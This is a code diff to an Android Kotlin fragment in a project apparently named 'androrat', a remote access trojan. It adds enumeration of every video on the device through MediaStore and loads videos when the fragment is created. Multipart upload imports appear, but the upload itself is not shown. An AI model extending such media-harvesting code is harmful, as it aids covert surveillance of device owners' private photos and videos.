@@ -24,8 +24,9 @@ import com.ierusalem.androrat.core.utils.getLongOrNull
 import com.ierusalem.androrat.core.utils.getStringOrNull
 import com.ierusalem.androrat.core.utils.toReadableDate
 import com.ierusalem.androrat.core.utils.toReadableFileSize
-import com.ierusalem.androrat.features.home.domain.model.Image
+import com.ierusalem.androrat.features.images.domain.Image
 import com.ierusalem.androrat.features.images.domain.ImageViewModel
+import com.ierusalem.androrat.features.images.domain.Video
 import kotlinx.coroutines.launch
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MultipartBody
@@ -44,10 +45,9 @@ class ImageFragment : Fragment() {
             MediaStore.Video.Media.MIME_TYPE,
             MediaStore.Video.Media.SIZE,
             MediaStore.Video.Media.DATE_TAKEN,
+            MediaStore.Video.Media.DURATION,
             MediaStore.Video.Media.DATE_ADDED,
             MediaStore.Video.Media.DATE_MODIFIED,
-            MediaStore.Video.Media.WIDTH,
-            MediaStore.Video.Media.HEIGHT,
             MediaStore.Video.Media.BUCKET_DISPLAY_NAME,
             MediaStore.Video.Media.RELATIVE_PATH,
             MediaStore.Video.Media.DURATION
@@ -55,7 +55,7 @@ class ImageFragment : Fragment() {
 
         val sortOrder = "${MediaStore.Video.Media.DATE_TAKEN} DESC"
 
-        val videos = mutableListOf<Image>() // Reusing your Image data class
+        val videos = mutableListOf<Video>() // Reusing your Image data class
 
         context.contentResolver.query(
             MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
@@ -69,10 +69,8 @@ class ImageFragment : Fragment() {
             val mimeTypeCol = cursor.getColumnIndex(MediaStore.Video.Media.MIME_TYPE)
             val sizeCol = cursor.getColumnIndex(MediaStore.Video.Media.SIZE)
             val dateTakenCol = cursor.getColumnIndex(MediaStore.Video.Media.DATE_TAKEN)
-            val widthCol = cursor.getColumnIndex(MediaStore.Video.Media.WIDTH)
-            val heightCol = cursor.getColumnIndex(MediaStore.Video.Media.HEIGHT)
+            val durationCol = cursor.getColumnIndex(MediaStore.Video.Media.DURATION)
             val bucketCol = cursor.getColumnIndex(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)
-            val pathCol = cursor.getColumnIndex(MediaStore.Video.Media.RELATIVE_PATH)
 
             while (cursor.moveToNext()) {
                 val id = cursor.getLong(idCol)
@@ -82,40 +80,26 @@ class ImageFragment : Fragment() {
                 val mimeType = cursor.getStringOrNull(mimeTypeCol)
                 val size = cursor.getLongOrNull(sizeCol)
                 val dateTaken = cursor.getLongOrNull(dateTakenCol)
-                val width = cursor.getIntOrNull(widthCol)
-                val height = cursor.getIntOrNull(heightCol)
+                val duration = cursor.getLongOrNull(durationCol)
                 val folderName = cursor.getStringOrNull(bucketCol)
-                val relativePath = cursor.getStringOrNull(pathCol)
 
                 videos.add(
-                    Image(
+                    Video(
                         id = id,
                         uri = uri,
                         displayName = displayName,
                         mimeType = mimeType,
                         size = size.toReadableFileSize(),
                         dateTaken = dateTaken.toReadableDate(),
-                        width = width,
-                        height = height,
+                        duration = duration,
                         folderName = folderName,
-                        relativePath = relativePath,
-                        author = null,
-                        description = null,
-                        orientation = null,
-                        latitude = null,
-                        longitude = null,
-                        cameraModel = null,
-                        iso = null,
-                        aperture = null,
-                        exposureTime = null
                     )
                 )
             }
 
-            //viewModel.updateVideos(videos) // You'll need a similar function to update video state
+            viewModel.updateVideos(videos) // You'll need a similar function to update video state
         }
     }
-
 
     private fun loadImages(context: Context) {
         val projection = arrayOf(
@@ -237,6 +221,7 @@ class ImageFragment : Fragment() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         loadImages(context = requireContext())
+        loadVideos(context = requireContext())
     }
 
     override fun onCreateView(
